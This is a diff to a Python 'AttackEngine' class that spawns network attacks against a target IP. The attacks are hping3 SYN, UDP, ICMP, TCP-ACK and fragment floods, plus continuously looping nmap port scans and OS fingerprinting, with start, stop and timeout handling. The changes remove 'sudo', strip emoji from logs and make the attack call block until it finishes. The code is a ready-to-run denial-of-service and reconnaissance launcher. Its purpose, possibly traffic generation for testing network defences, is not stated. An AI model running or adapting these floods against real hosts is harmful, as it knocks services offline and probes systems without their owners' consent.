@@ -38,13 +38,13 @@ class AttackEngine:
         Returns:
             bool: True if attack started successfully, False otherwise
         """
-        logger.info(f"🔨 Starting {attack_type} attack on {target_ip} for {duration} seconds")
+        logger.info(f"Starting {attack_type} attack on {target_ip} for {duration} seconds")
         
         try:
             command = self._build_attack_command(attack_type, target_ip, interface)
             
             if not command:
-                logger.error(f"❌ Unknown attack type: {attack_type}")
+                logger.error(f"Unknown attack type: {attack_type}")
                 return False
             
             # Add timeout to the command if it's a continuous attack
@@ -66,18 +66,18 @@ class AttackEngine:
                     'interface': interface,
                     'duration': duration
                 }
-                logger.info(f"✅ Attack started successfully (PID: {self.attack_process.pid})")
+                logger.info(f"Attack started successfully (PID: {self.attack_process.pid})")
                 
-                # Start a background task to monitor and auto-cleanup
-                asyncio.create_task(self._monitor_attack(duration))
-                
+                # Wait for the process to finish (blocks for duration seconds)
+                await self.attack_process.wait()
+                logger.info("Attack process finished")
                 return True
             else:
-                logger.error("❌ Failed to start attack process")
+                logger.error("Failed to start attack process")
                 return False
                 
         except Exception as e:
-            logger.error(f"❌ Failed to start attack: {e}")
+            logger.error(f"Failed to start attack: {e}")
             return False
     
     def _build_attack_command(self, attack_type: str, target_ip: str, interface: str) -> Optional[list]:
@@ -85,31 +85,31 @@ class AttackEngine:
         
         attack_commands = {
             'syn_flood': [
-                'sudo', 'hping3', '-S', '-I', interface, 
+                'hping3', '-S', '-I', interface, 
                 '-p', '55443', '-i', 'u1000', '--flood', target_ip
             ],
             'udp_flood': [
-                'sudo', 'hping3', '--udp', '-I', interface,
+                'hping3', '--udp', '-I', interface,
                 '-p', '55443', '-i', 'u1000', '--flood', target_ip
             ],
             'icmp_flood': [
-                'sudo', 'hping3', '--icmp', '--flood', target_ip
+                'hping3', '--icmp', '--flood', target_ip
             ],
             'tcp_flood': [
-                'sudo', 'hping3', '-A', '-I', interface,
+                'hping3', '-A', '-I', interface,
                 '-p', '55443', '-i', 'u1000', '--flood', target_ip
             ],
             'ip_frag_flood': [
-                'sudo', 'hping3', '-f', '-I', interface,
+                'hping3', '-f', '-I', interface,
                 '-p', '55443', '--flood', target_ip
             ],
             'port_scan': [
                 'bash', '-c', 
-                f'while true; do sudo nmap -sS -p- {target_ip}; sleep 1; done'
+                f'while true; do nmap -sS -p- {target_ip}; sleep 1; done'
             ],
             'os_fingerprint': [
                 'timeout', '60s', 'bash', '-c',
-                f'while true; do sudo nmap -O --osscan-guess -p- {target_ip}; done'
+                f'while true; do nmap -O --osscan-guess -p- {target_ip}; done'
             ]
         }
         
@@ -123,7 +123,7 @@ class AttackEngine:
             bool: True if attack stopped successfully, False otherwise
         """
         if not self.attack_process:
-            logger.warning("⚠️ No attack process to stop")
+            logger.warning("No attack process to stop")
             return False
         
         try:
@@ -134,18 +134,18 @@ class AttackEngine:
             try:
                 await asyncio.wait_for(self.attack_process.wait(), timeout=5.0)
             except asyncio.TimeoutError:
-                logger.warning("⚠️ Process didn't terminate gracefully, forcing kill")
+                logger.warning("Process didn't terminate gracefully, forcing kill")
                 self.attack_process.kill()
                 await self.attack_process.wait()
             
-            logger.info("✅ Attack stopped successfully")
+            logger.info("Attack stopped successfully")
             self.attack_process = None
             self.current_attack = None
             self.attack_config = None
             return True
             
         except Exception as e:
-            logger.error(f"❌ Failed to stop attack: {e}")
+            logger.error(f"Failed to stop attack: {e}")
             # Force cleanup
             if self.attack_process:
                 try:
@@ -188,13 +188,13 @@ class AttackEngine:
             
             # Check if process is still running
             if self.attack_process and self.attack_process.returncode is None:
-                logger.info(f"⏰ Attack duration ({duration}s) completed, stopping attack")
+                logger.info(f"Attack duration ({duration}s) completed, stopping attack")
                 await self.stop_attack()
             else:
-                logger.info("✅ Attack completed naturally")
+                logger.info("Attack completed naturally")
                 
         except Exception as e:
-            logger.error(f"❌ Error in attack monitoring: {e}")
+            logger.error(f"Error in attack monitoring: {e}")
             # Ensure cleanup
             if self.attack_process:
                 try:
@@ -272,3 +272,4 @@ if __name__ == '__main__':
     
     # Run test
     asyncio.run(test_attack_engine())
+ 
